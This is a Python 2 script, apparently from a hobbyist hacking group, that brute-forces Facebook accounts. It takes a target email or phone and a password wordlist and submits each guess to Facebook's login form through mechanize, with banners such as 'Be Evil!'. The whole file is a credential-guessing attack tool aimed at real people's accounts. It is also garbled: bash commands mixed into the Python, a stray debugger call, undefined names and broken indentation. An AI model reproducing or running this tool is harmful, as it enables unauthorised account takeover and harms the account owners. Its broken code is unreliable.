import time
import mechanize
import sys
import random
import cookielib
import pdb
import os
import sys
from urllib2 import *
import re
import sys,os
import random
 
--#!/system/xbin/bash
clear
toilet -f slant --gay "FSF-All-Star"
sleep 1
 
print
print "===================="
print "1. Brute Force Facebook"
print "===================="
print
choice = input("Root@FSF_All_Star >> ")
 
   
if choice == 1: 
 
    print("     \033[0;34;47m***********************************************\033[1;37;40m")
print("     \033[0;34;47m*      Welcome To Progamming.                 *\033[1;37;40m")
print("     \033[0;34;47m***********************************************\033[1;37;40m")
print("     \033[0;34;47m*  Rumah  *       Pesan *    Pemberitahuan    *\033[1;37;40m")
print("     \033[0;34;47m***********************************************\033[1;37;40m")
print("     \033[0;34;47m*     *                                       *\033[1;37;40m")
print("     \033[0;34;47m*     *             Hacked                    *\033[1;37;40m")
print("     \033[0;34;47m*******                                       *\033[1;37;40m")
print("     \033[0;34;47m***********************************************\033[1;37;40m")
print("     \033[0;34;47m***********************************************\033[1;37;40m")
print("     \033[0;34;47m*        Terhacked BruteForce Attack!!       *\033[1;37;40m")
print("     \033[0;34;47m*                                             *\033[1;37;40m")
print("     \033[0;34;47m*                                             *\033[1;37;40m")
print("     \033[0;34;47m*                                             *\033[1;37;40m")
print("     \033[0;34;47m_______________________________________________\033[1;37;40m")
print("")
print "  \033[1;31;40m"
print("              Brute Force FaceBook")
print("              H4pPy F0r Pl4Y1n6™ ×- iL MmaaiilL")
print("              Cracker'$ by : INDOFams StarFive All Star\033[1;37;40m")
header = """
"""
print header
print("_______________________________________________________")
print ""
email = str (raw_input ("\033[0;32;47mEnter Target Email/Phone:\033[1;37;40m"))
print ""
print("_______________________________________________________")
print ""
print("")
 
passwordlist = str ( raw_input ("\033[0;32;47mWordlist: \033[1;37;40m"))
print ""
print("_______________________________________________________")
useragents = [( 'User-agent' , 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc')]
login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack (password):
  try:
     sys.stdout.write( "\r[*] Possible Password: %s .. " % password)
     sys.stdout.flush()
     br.addheaders = [( 'User-agent' , random.choice(useragents))]
     site = br.open(login)
     br.select_form( nr =0 )
 
     
     br.form[ 'email' ] = email
     br.form[ 'pass' ] =password
     br.submit()
     log = br.geturl()
     if (log != login) and (not 'login_attempt' in log):
        pdb.set_trace()
        print "\033[1;31;40m[*] Password found .. !!"
        print "\033[1;32;40m\n[*] Password : %s\n\033[1;37;40m" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        time.sleep(1.5)
        bar = progressbar .ProgressBar()
        for i in bar( range (50)):
           time.sleep(0.04)
        print("[DONE]")
        sys.exit(1)
def search ():
    global password
    for password in passwords:
        attack(password.replace( "\n" , ""))
def check ():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots( False )
       br.set_handle_equiv( True )
       br.set_handle_referer( True)
       br.set_handle_redirect( True )
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
    except KeyboardInterrupt:
          print "\n[*] Exiting program ..\n"
          time.sleep(1.5)
          bar = progressbar .ProgressBar()
          for i in bar( range (50)):
             time.sleep(0.04)
          print Y + ("[DONE]")
          sys.exit(1)
    try:
       list = open(passwordlist, "r" )
       passwords = list .readlines()
       k = 0
       while k < len (passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n[*] Invalid file path!! \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n[*] Exiting program ..\n"
        time.sleep(1.5)
        bar = progressbar .ProgressBar()
        for i in bar( range (50)):
           time.sleep(0.04)
        print("[DONE]")
        sys.exit(1)
    try:
       time.sleep(2.5)
       
       time.sleep(3.5)
       print("\033[1;36;40m_______________________________________________________")
       print ""
       print "   Target Facebook Account: %s" % (email)
       print("_______________________________________________________\033[1;37;40m")
       time.sleep(2.5)
       print ""
       print("\033[1;35;40m_______________________________________________________")
       print "   Reading Possible Passwords..."
       print("_______________________________________________________")
       time.sleep(2.5)
       print ""
       print("\033[1;33;40m_______________________________________________________")
       print "" , len (passwords), " Possible passwords"
       print("_______________________________________________________")
       time.sleep(2.0)
       print "Be Evil!"
       time.sleep(2.0)
       print "Be Powerfull!"
       time.sleep(2.0)
       header = """
                 
  (҂⌣̀_⌣́) WhY So SeR10u5..
                       i K1iL Y0u.. •--==[--]---=(^.^ -)
                  """
       print header
       time.sleep(2.0)
       print ""
       print "\033[1;34;40m Please be Patience!\033[1;37;40m"
       time.sleep(3.0)
       print ""
       print "\033[1;32;40mTrying all Passible Password\033[1;37;40m"
       time.sleep(2.0)
       print ""
       print "\033[1;31;40m Cracking.... please be Patient! ....\033[1;37;40m"
       print "\n\n\n\n"
       time.sleep(1.5)
    except KeyboardInterrupt:
        print "\n[*] Exiting program ..\n"
        time.sleep(1.5)
        bar = progressbar .ProgressBar()
        for i in bar( range (50)):
           time.sleep(0.04)
        print("[DONE]")
        sys.exit(1)
    try:
       search()
       attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        time.sleep(1.5)
        bar = progressbar .ProgressBar()
        for i in bar( range (50)):
           time.sleep(0.04)
        print("[DONE]")
        sys.exit(1)
if __name__ == '__main__' :
    check()
print "Thanks for using this program"
 
